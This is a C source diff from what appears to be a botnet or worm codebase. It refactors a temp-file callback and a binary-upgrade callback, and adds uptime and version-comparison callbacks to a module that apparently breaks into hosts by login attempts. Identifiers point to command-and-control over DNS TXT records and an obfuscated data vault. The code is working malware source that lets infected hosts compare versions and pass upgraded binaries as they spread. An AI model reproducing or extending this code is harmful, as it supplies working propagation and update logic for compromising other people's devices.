@@ -142,10 +142,17 @@ static bool cb_htbt_hostinfo (void *ctx, prne_htbt_host_info_t *out) {
 	return true;
 }
 
-static char *cb_htbt_tmpfile (void *ctx, size_t req_size, const mode_t mode) {
+static int cb_tmpfile (
+	void *ctx,
+	const int flags,
+	const mode_t mode,
+	size_t req_size,
+	char **opath)
+{
 	uint8_t m[16];
-	char *path = prne_alloc_str(36 + 3), *ret = NULL;
+	char *path = prne_alloc_str(36 + 3);
 	int fd = -1;
+	bool ret = false;
 
 	path[0] = 0;
 	do {
@@ -161,30 +168,35 @@ static char *cb_htbt_tmpfile (void *ctx, size_t req_size, const mode_t mode) {
 		prne_uuid_tostr(m, path + 3);
 		path[39] = 0;
 
-		fd = open(path, O_RDWR | O_CREAT | O_TRUNC, mode);
+		fd = open(path, flags, mode);
 		if (fd < 0) {
 			break;
 		}
-		chmod(path, mode);
 		if (ftruncate(fd, req_size) != 0) {
 			break;
 		}
 
-		ret = path;
-		path = NULL;
+		ret = true;
 	} while (false);
 
-	if (path != NULL) {
+	if (ret) {
+		if (opath != NULL) {
+			*opath = path;
+			path = NULL;
+		}
+	}
+	else {
 		if (fd >= 0) {
 			unlink(path);
 		}
-		prne_free(path);
+		prne_close(fd);
+		fd = -1;
 	}
-	prne_close(fd);
-	return ret;
+	prne_free(path);
+	return fd;
 }
 
-static bool cb_htbt_upbin (
+static bool cb_upbin (
 	void *ctx,
 	const char *path,
 	const prne_htbt_cmd_t *cmd)
@@ -224,8 +236,8 @@ static void alloc_htbt (void) {
 	param.resolv = prne_g.resolv;
 	param.cb_f.cnc_txtrec = cb_htbt_cnc_txtrec;
 	param.cb_f.hostinfo = cb_htbt_hostinfo;
-	param.cb_f.tmpfile = cb_htbt_tmpfile;
-	param.cb_f.upbin = cb_htbt_upbin;
+	param.cb_f.tmpfile = cb_tmpfile;
+	param.cb_f.upbin = cb_upbin;
 	param.rcb = &prne_g.rcb_param;
 	param.blackhole = prne_g.blackhole[1];
 
@@ -1216,6 +1228,40 @@ static void bne_cb_exit_dd (void *ctx) {
 	prne_dvault_reset();
 }
 
+static uint64_t bne_cb_uptime (void *ctx) {
+	return prne_sub_timespec(
+		prne_gettime(CLOCK_MONOTONIC),
+		prne_g.child_start).tv_sec;
+}
+
+static int bne_cb_vercmp (void *ctx, const uint8_t *uuid) {
+	size_t l;
+	const void *ver_mat;
+	int ret;
+
+	if (memcmp(
+			prne_dvault_get_bin(PRNE_DATA_KEY_PROG_VER, NULL),
+			uuid,
+			16) == 0)
+	{
+		ret = 0;
+		goto END;
+	}
+
+	ver_mat = prne_dvault_get_bin(PRNE_DATA_KEY_VER_MAT, &l);
+	prne_dbgast(l % 16 == 0);
+	if (bsearch(uuid, ver_mat, l / 16, 16, prne_cmp_uuid_asc) == NULL) {
+		ret = -1;
+	}
+	else {
+		ret = 1;
+	}
+
+END:
+	prne_dvault_reset();
+	return ret;
+}
+
 static char *bne_cb_exec_name (void *ctx) {
 	size_t dvl;
 	const char *dv_str;
@@ -1258,6 +1304,10 @@ static void init_bne (void) {
 	bne_param.cb.exec_name = bne_cb_exec_name;
 	bne_param.cb.enter_dd = bne_cb_enter_dd;
 	bne_param.cb.exit_dd = bne_cb_exit_dd;
+	bne_param.cb.uptime = bne_cb_uptime;
+	bne_param.cb.vercmp = bne_cb_vercmp;
+	bne_param.cb.tmpfile = cb_tmpfile;
+	bne_param.cb.upbin = cb_upbin;
 
 	bne_param.rcb = &prne_g.rcb_param;
 	bne_param.login_attempt = PRNE_BNE_LOGIN_ATTEMPT;
